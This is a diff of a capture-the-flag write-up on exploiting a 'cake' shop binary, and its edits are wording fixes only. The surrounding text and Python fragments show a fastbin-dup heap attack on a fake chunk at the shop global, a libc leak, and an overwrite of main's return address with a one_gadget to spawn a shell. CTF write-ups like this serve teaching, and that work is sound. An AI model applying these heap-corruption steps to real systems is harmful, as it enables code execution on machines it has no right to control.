@@ -40,9 +40,7 @@ This program uses `stdin`, which points to `_IO_2_1_stdin_` in libc.
 
 We have indirect control over `shop + 0x00` (total sales) and `shop + 0x08` (number of customers waiting).
 
-Initially, I tried `shop + 0x00`. I got the leak, but wound up having a corrupted chunk in `fastbin` I lost control of. As a result, the subsequent `malloc` calls resulted in crash.
-
-Thus, we will use `shop + 0x08` instead.
+Initially, I tried `shop + 0x00`. I got the leak, but wound up having a corrupted chunk in `fastbin` I lost control of. As a result, the subsequent `malloc` calls resulted in a crash. Thus, we will use `shop + 0x08` instead.
 
 I used the following code to get the address of the `cake` symbols and the pre-ASLR addresses of the `libc` symbols.
 
@@ -59,7 +57,7 @@ file_environ = libc.symbols['environ']
 file_libc_text = libc.get_section_by_name('.text').header.sh_addr
 ```
 
-First, prepare a fake chunk for `fastbin`. The size of all of the malloc requests are hardcoded as 0x10 bytes and fall into `fastbin[0]`. Hence, we must keep `shop + 0x8` in the range of `0x20`-`0x2f`. We're allowed up to `0x2f` because `malloc` ignores the lower 4 bits when allocating from `fastbin`.
+First, we prepare a fake chunk for `fastbin`. The size of all of the malloc requests are hardcoded as 0x10 bytes and fall into `fastbin[0]`. Hence, we must keep `shop + 0x8` in the range of `0x20`-`0x2f`. We're allowed up to `0x2f` because `malloc` ignores the lower 4 bits when allocating from `fastbin`.
 
 For every line of input to `main`, there is a $`\frac{1}{3}`$ chance of receiving a new customer. Therefore, we will need at least `96` arbitrary commands to get `0x20` customers. 
 However, due to the `serve()` command, we must take into account of decrementing the customer headcount.
@@ -72,7 +70,7 @@ for i in range(109):
     wait_prompt()
 ```
 
-Next, follow the logic in `fastbin_dup.c` from https://github.com/shellphish/how2heap.
+Next, we follow the logic in `fastbin_dup.c` from https://github.com/shellphish/how2heap.
 
 ```python
 c0 = make_cake(0x0, p64(0x0))  # chunk_0
@@ -84,7 +82,7 @@ chunk_1 = inspect(c0)
 chunk_0 = inspect(c1)
 ```
 
-Third, link our fake chunk `shop` into `fastbin`.
+Third, we link our fake chunk `shop` into `fastbin`.
 ```python
 c2 = make_cake(shop, p64(0x0))   # malloc return chunk_0
 c3 = make_cake(0x0, '')          # malloc return chunk_1
@@ -179,7 +177,7 @@ To achieve this, just set `shop + 0x18` to `NULL`. We can do this because `mallo
 c11 = make_cake(shop, p64(0))
 ```
 
-We set the return address of the `main` function to the `one_gadget` address* in `libc`. Once we close the shop, we will get into the shell.
+We set the return address of the `main` function to the `one_gadget` address* in `libc`. Once we close the shop, we get into the shell.
 
 ```python
 c1 = make_cake(one_gadget, p64(main_return_address))
